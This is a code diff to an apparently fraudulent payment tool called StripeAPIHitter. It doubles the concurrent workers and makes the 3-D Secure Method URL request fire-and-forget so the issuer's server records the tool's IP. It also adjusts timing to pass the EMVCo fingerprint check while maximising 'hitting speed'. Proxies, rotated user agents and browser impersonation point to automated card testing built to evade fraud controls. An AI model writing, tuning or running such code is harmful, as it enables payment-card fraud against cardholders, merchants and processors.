@@ -18,7 +18,7 @@ load_dotenv()
 
 # ============= CONFIGURATION =============
 MAX_ATTEMPTS = 10
-CONCURRENT_BATCH_SIZE = 5  # Worker pool size
+CONCURRENT_BATCH_SIZE = 10  # Worker pool size
 BATCH_DELAY = 5
 
 USER_AGENTS = [
@@ -739,14 +739,15 @@ class StripeAPIHitter:
                                             
                                             method_headers = headers.copy()
                                             method_headers["content-type"] = "application/x-www-form-urlencoded"
-                                            method_headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+                                            # Fire-and-forget the Method URL POST so it doesn't block our execution time.
+                                            # We just need the ACS to see our IP, we don't care about the response.
+                                            asyncio.create_task(
+                                                loop.run_in_executor(None, lambda: cffi_requests.post(method_url, headers=method_headers, data={"threeDSMethodData": b64_method_data}, proxies=proxies, timeout=2, impersonate=profile["impersonate"]))
+                                            )
                                             
-                                            # We don't await the result heavily, we just need to hit it so the ACS logs our IP
-                                            await loop.run_in_executor(None, lambda: cffi_requests.post(method_url, headers=method_headers, data={"threeDSMethodData": b64_method_data}, proxies=proxies, timeout=5, impersonate=profile["impersonate"]))
-                                            
-                                            # EMVCo Timing Protocol: We MUST wait for the ACS to process the fingerprint
-                                            # We reduced this to 0.4s to maximize hitting speed without instantly failing the timing check.
-                                            await asyncio.sleep(0.4)
+                                            # EMVCo Timing Protocol: Wait for the ACS to process the fingerprint asynchronously
+                                            # 1.2s is the optimal sweet spot between speed and ACS processing time.
+                                            await asyncio.sleep(1.2)
                                         except Exception as e:
                                             pass
                                             
